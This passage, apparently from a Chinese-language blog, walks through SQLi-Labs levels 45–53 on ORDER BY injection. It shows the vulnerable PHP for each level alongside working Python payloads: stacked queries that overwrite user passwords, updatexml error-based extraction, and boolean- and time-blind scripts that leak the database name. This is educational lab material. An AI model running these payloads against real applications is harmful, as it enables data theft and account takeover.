punctuation\\\"\u003e)\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"payload = \\\"x'); UPDATE security.users SET password='hacked-L45' WHERE id='1'; -- \\\"\\nresp = query_post(\\\"Less-45/login.php\\\", data={\\\"login_user\\\": \\\"x\\\", \\\"login_password\\\": payload})\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"payload \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"x'); UPDATE security.users SET password='hacked-L45' WHERE id='1'; -- \\\"\u003c/span\u003e\\nresp \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e query_post\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token string\\\"\u003e\\\"Less-45/login.php\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e data\u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e{\u003c/span\u003e\u003cspan class=\\\"token string\\\"\u003e\\\"login_user\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e:\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"x\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"login_password\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e:\u003c/span\u003e payload\u003cspan class=\\\"token punctuation\\\"\u003e}\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"h2\",null,{\"className\":\"x-h1\",\"children\":\"ORDER BY注入：L46-L53\"}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"前言 \u0026 笔记\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eORDER BY\u003c/code\u003e的正常使用：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"SQL\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"SELECT * FROM users ORDER BY 2; -- 按照第2列排序（默认升序）\\nSELECT * FROM users ORDER BY rand(); -- 随机排序\\nSELECT * FROM users ORDER BY username; -- 按照用户名排序（默认升序）\\nSELECT * FROM users ORDER BY username ASC, id DESC; -- 先按用户名升序排序，再按ID降序排序\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$31\"}}]}]]}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"注入思路1：布尔盲注\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"这里的盲注不一定是看不到回显，而是无法通过注入直接获取数据，只能通过不同的排序行为来泄露一比特的条件信息。\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"SQL\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"SELECT * FROM users ORDER BY if(cond, id, username);\\nSELECT * FROM users ORDER BY rand(cond);\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token keyword\\\"\u003eSELECT\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e*\u003c/span\u003e \u003cspan class=\\\"token keyword\\\"\u003eFROM\u003c/span\u003e users \u003cspan class=\\\"token keyword\\\"\u003eORDER\u003c/span\u003e \u003cspan class=\\\"token keyword\\\"\u003eBY\u003c/span\u003e \u003cspan class=\\\"token keyword\\\"\u003eif\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003econd\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e id\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e username\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\u003cspan class=\\\"token keyword\\\"\u003eSELECT\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e*\u003c/span\u003e \u003cspan class=\\\"token keyword\\\"\u003eFROM\u003c/span\u003e users \u003cspan class=\\\"token keyword\\\"\u003eORDER\u003c/span\u003e \u003cspan class=\\\"token keyword\\\"\u003eBY\u003c/span\u003e rand\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003econd\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eORDER BY rand()\u003c/code\u003e实现随机排序的原理是每一行都会调用\u003ccode class=\\\"x-inline-highlight\\\"\u003erand()\u003c/code\u003e生成一个随机数，然后根据这个随机数排序。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"MySQL的\u003ccode class=\\\"x-inline-highlight\\\"\u003erand()\u003c/code\u003e函数可以接受一个整数参数作为种子值，当传入相同的种子值时，\u003ccode class=\\\"x-inline-highlight\\\"\u003erand(seed)\u003c/code\u003e会生成相同的随机数序列，因此一个\u003ccode class=\\\"x-inline-highlight\\\"\u003econd\u003c/code\u003e条件的真假会影响排序结果，相当于设置了种子值为\u003ccode class=\\\"x-inline-highlight\\\"\u003e0\u003c/code\u003e或\u003ccode class=\\\"x-inline-highlight\\\"\u003e1\u003c/code\u003e。\"}}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"注入思路2：时间盲注\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"SQL\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"SELECT * FROM users ORDER BY '...', sleep(1);\\nSELECT * FROM users ORDER BY '...' OR sleep(1);\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token keyword\\\"\u003eSELECT\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e*\u003c/span\u003e \u003cspan class=\\\"token keyword\\\"\u003eFROM\u003c/span\u003e users \u003cspan class=\\\"token keyword\\\"\u003eORDER\u003c/span\u003e \u003cspan class=\\\"token keyword\\\"\u003eBY\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e'...'\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e sleep\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token number\\\"\u003e1\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\u003cspan class=\\\"token keyword\\\"\u003eSELECT\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e*\u003c/span\u003e \u003cspan class=\\\"token keyword\\\"\u003eFROM\u003c/span\u003e users \u003cspan class=\\\"token keyword\\\"\u003eORDER\u003c/span\u003e \u003cspan class=\\\"token keyword\\\"\u003eBY\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e'...'\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003eOR\u003c/span\u003e sleep\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token number\\\"\u003e1\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-highlightblock highlight-background-golden\",\"children\":[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"语句\u003ccode class=\\\"x-inline-highlight\\\"\u003eSELECT * FROM users ORDER BY '...' OR sleep(1);\u003c/code\u003e实际上是\u003ccode class=\\\"x-inline-highlight\\\"\u003eORDER BY\u003c/code\u003e逻辑表达式\u003ccode class=\\\"x-inline-highlight\\\"\u003e'...' OR sleep(1)\u003c/code\u003e的值，语句的实际意义不大。\"}}]}],[\"$\",\"div\",null,{\"className\":\"x-highlightblock highlight-background-golden\",\"children\":[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eORDER BY sleep(1)\u003c/code\u003e函数会对每一行调用\u003ccode class=\\\"x-inline-highlight\\\"\u003esleep(1)\u003c/code\u003e，假设有\u003ccode class=\\\"x-inline-highlight\\\"\u003eN\u003c/code\u003e行数据，那么整个查询会延时\u003ccode class=\\\"x-inline-highlight\\\"\u003eN\u003c/code\u003e秒。\"}}]}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"注入思路3：报错盲注\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"如果服务端开启了报错回显，注入思路和报错注入是一样的。\"}}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L46\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"PHP\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"$$sort = $_GET['sort'];\\n$sql = \\\"SELECT * FROM users ORDER BY $sort\\\";\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token variable\\\"\u003e$sort\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token variable\\\"\u003e$_GET\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e[\u003c/span\u003e\u003cspan class=\\\"token string single-quoted-string\\\"\u003e'sort'\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e]\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\u003cspan class=\\\"token variable\\\"\u003e$sql\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string double-quoted-string\\\"\u003e\\\"SELECT * FROM users ORDER BY \u003cspan class=\\\"token interpolation\\\"\u003e\u003cspan class=\\\"token variable\\\"\u003e$sort\u003c/span\u003e\u003c/span\u003e\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"报错注入：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"payload = \\\"?sort=updatexml(null,concat(0x7e,(SELECT database()),0x7e),null) -- \\\"\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"payload \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"?sort=updatexml(null,concat(0x7e,(SELECT database()),0x7e),null) -- \\\"\u003c/span\u003e\"}}]}]]}],[\"$\",\"$L17\",null,{\"src\":\"L46.jpg\",\"width\":\"100%\"}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L47\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"PHP\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"$$sort = $_GET['sort'];\\n$sql = \\\"SELECT * FROM users ORDER BY '$sort'\\\";\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token variable\\\"\u003e$sort\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token variable\\\"\u003e$_GET\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e[\u003c/span\u003e\u003cspan class=\\\"token string single-quoted-string\\\"\u003e'sort'\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e]\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\u003cspan class=\\\"token variable\\\"\u003e$sql\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string double-quoted-string\\\"\u003e\\\"SELECT * FROM users ORDER BY '\u003cspan class=\\\"token interpolation\\\"\u003e\u003cspan class=\\\"token variable\\\"\u003e$sort\u003c/span\u003e\u003c/span\u003e'\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"报错注入：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"payload = \\\"?sort=x' OR updatexml(null,concat(0x7e,(SELECT database()),0x7e),null) -- \\\"\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"payload \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"?sort=x' OR updatexml(null,concat(0x7e,(SELECT database()),0x7e),null) -- \\\"\u003c/span\u003e\"}}]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L48\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"PHP\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"$$sort = $_GET['sort'];\\n$sql = \\\"SELECT * FROM users ORDER BY $sort\\\";\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token variable\\\"\u003e$sort\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token variable\\\"\u003e$_GET\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e[\u003c/span\u003e\u003cspan class=\\\"token string single-quoted-string\\\"\u003e'sort'\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e]\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\u003cspan class=\\\"token variable\\\"\u003e$sql\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string double-quoted-string\\\"\u003e\\\"SELECT * FROM users ORDER BY \u003cspan class=\\\"token interpolation\\\"\u003e\u003cspan class=\\\"token variable\\\"\u003e$sort\u003c/span\u003e\u003c/span\u003e\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"报错回显被关闭了，考虑使用布尔盲注：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"payload = \\\"?sort=rand(substr(database(),1,1)='!') -- \\\"\\nresp = query_get(\\\"Less-48\\\", payload)\\nhash_false = sha256(resp.text.encode()).hexdigest()\\n\\n\\ndef test(payload):\\n    resp = query_get(\\\"Less-48\\\", payload)\\n    hash_resp = sha256(resp.text.encode()).hexdigest()\\n    print(payload, \\\":\\\", hash_resp != hash_false)\\n\\n\\ntest(\\\"?sort=rand(substr(database(),1,1)='?') -- \\\")  # False\\ntest(\\\"?sort=rand(substr(database(),1,1)='s') -- \\\")  # True\\ntest(\\\"?sort=rand(substr(database(),2,1)='e') -- \\\")  # True\\ntest(\\\"?sort=rand(substr(database(),3,1)='c') -- \\\")  # True\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$32\"}}]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L49\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"PHP\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"$$sort = $_GET['sort'];\\n$sql = \\\"SELECT * FROM users ORDER BY '$sort'\\\";\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token variable\\\"\u003e$sort\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token variable\\\"\u003e$_GET\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e[\u003c/span\u003e\u003cspan class=\\\"token string single-quoted-string\\\"\u003e'sort'\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e]\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\u003cspan class=\\\"token variable\\\"\u003e$sql\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string double-quoted-string\\\"\u003e\\\"SELECT * FROM users ORDER BY '\u003cspan class=\\\"token interpolation\\\"\u003e\u003cspan class=\\\"token variable\\\"\u003e$sort\u003c/span\u003e\u003c/span\u003e'\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"布尔盲注仍然可用：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"payload = \\\"?sort=x' OR rand(999) \u003c rand(substr(database(),1,1)='!') -- \\\"\\nresp = query_get(\\\"Less-49\\\", payload)\\nhash_false = sha256(resp.text.encode()).hexdigest()\\n\\n\\ndef test(payload):\\n    resp = query_get(\\\"Less-49\\\", payload)\\n    hash_resp = sha256(resp.text.encode()).hexdigest()\\n    print(payload, \\\":\\\", hash_resp != hash_false)\\n\\n\\ntest(\\\"?sort=x' OR rand(999) \u003c rand(substr(database(),1,1)='?') -- \\\")  # False\\ntest(\\\"?sort=x' OR rand(999) \u003c rand(substr(database(),1,1)='s') -- \\\")  # True\\ntest(\\\"?sort=x' OR rand(999) \u003c rand(substr(database(),2,1)='e') -- \\\")  # True\\ntest(\\\"?sort=x' OR rand(999) \u003c rand(substr(database(),3,1)='c') -- \\\")  # True\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$33\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"原理是，由于服务端传入的\u003ccode class=\\\"x-inline-highlight\\\"\u003esort\u003c/code\u003e参数被单引号包裹，闭合后形成\u003ccode class=\\\"x-inline-highlight\\\"\u003eORDER BY 'x' OR rand(999) \u0026#60; rand(...)\u003c/code\u003e，也就是根据逻辑表达式\u003ccode class=\\\"x-inline-highlight\\\"\u003e'x' OR rand(999) \u0026#60; rand(...)\u003c/code\u003e的值进行排序。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"字符串\u003ccode class=\\\"x-inline-highlight\\\"\u003e'x'\u003c/code\u003e在MySQL中被转换为整数\u003ccode class=\\\"x-inline-highlight\\\"\u003e0\u003c/code\u003e（因为不是以数字开头），因此逻辑关系用\u003ccode class=\\\"x-inline-highlight\\\"\u003eOR\u003c/code\u003e来确保后面的表达式\u003ccode class=\\\"x-inline-highlight\\\"\u003erand(999) \u0026#60; rand(...)\u003c/code\u003e被计算；当条件分别为真或假时，相当于计算\u003ccode class=\\\"x-inline-highlight\\\"\u003erand(999) \u0026#60; rand(0)\u003c/code\u003e或\u003ccode class=\\\"x-inline-highlight\\\"\u003erand(999) \u0026#60; rand(1)\u003c/code\u003e。这里\u003ccode class=\\\"x-inline-highlight\\\"\u003e999\u003c/code\u003e可随意填写。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003erand(0)\u003c/code\u003e、\u003ccode class=\\\"x-inline-highlight\\\"\u003erand(1)\u003c/code\u003e、\u003ccode class=\\\"x-inline-highlight\\\"\u003erand(999)\u003c/code\u003e由于固定了种子，生成的序列都是确定的，因此最后的排序结果是稳定的；而序列\u003ccode class=\\\"x-inline-highlight\\\"\u003erand(0)\u003c/code\u003e、\u003ccode class=\\\"x-inline-highlight\\\"\u003erand(1)\u003c/code\u003e不同，导致最终结果行的顺序不同，从而可以用于判断条件是否成立。\"}}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"时间盲注\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"# ?sort=x' OR sleep(if(substr(database(),1,1)='!', 0.3, 0)) --+\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token comment\\\"\u003e# ?sort=x' OR sleep(if(substr(database(),1,1)='!', 0.3, 0)) --+\u003c/span\u003e\"}}]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L50-L53\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"服务端使用\u003ccode class=\\\"x-inline-highlight\\\"\u003emysqli_multi_query\u003c/code\u003e：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"PHP\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"$$sort = $_GET['sort'];\\n$sql = \\\"SELECT * FROM users ORDER BY $sort\\\"; // BY '$sort'\\\"\\nif (mysqli_multi_query($con1, $sql)) {\\n    // ...\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$34\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"使用堆叠注入是最简单的方式。L52和L53分别是L50和L51的盲注版本。\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"payload = \\\"?sort=1; UPDATE security.users SET password='hacked-L50' WHERE id='1'; -- \\\"\\npayload = \\\"?sort=1'; UPDATE security.users SET password='hacked-L51' WHERE id='1'; -- \\\"\\npayload = \\\"?sort=1; UPDATE security.users SET password='hacked-L52' WHERE id='1'; -- \\\"\\npayload = \\\"?sort=1'; UPDATE security.users SET password='hacked-L53' WHERE id='1'; -- \\\"\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"payload \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"?sort=1; UPDATE security.users SET password='hacked-L50' WHERE id='1'; -- \\\"\u003c/span\u003e\\npayload \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"?sort=1'; UPDATE security.users SET password='hacked-L51' WHERE id='1'; -- \\\"\u003c/span\u003e\\npayload \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"?sort=1; UPDATE security.users SET password='hacked-L52' WHERE id='1'; -- \\\"\u003c/span\u003e\\npayload \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"?sort=1'; UPDATE security.users SET password='hacked-L53' WHERE id='1'; -- \\\"\u003c/span\u003e\\n\"}}]}]]}]]\n"])</script><script>self.__next_f.push([1,"12:[[\"$\",\"meta\",\"0\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}],[\"$\",\"meta\",\"1\",{\"charSet\":\"utf-8\"}],[\"$\",\"title\",\"2\",{\"children\":\"SQLi Labs - 铃木的网络日记\"}],[\"$\",\"link\",\"3\",{\"rel\":\"canonical\",\"href\":\"https://1kuzus.github.io/25d/sqli-labs/\"}]]\n6:null\n"])</script><script>self.__next_f.push([1,""])</script></body></html>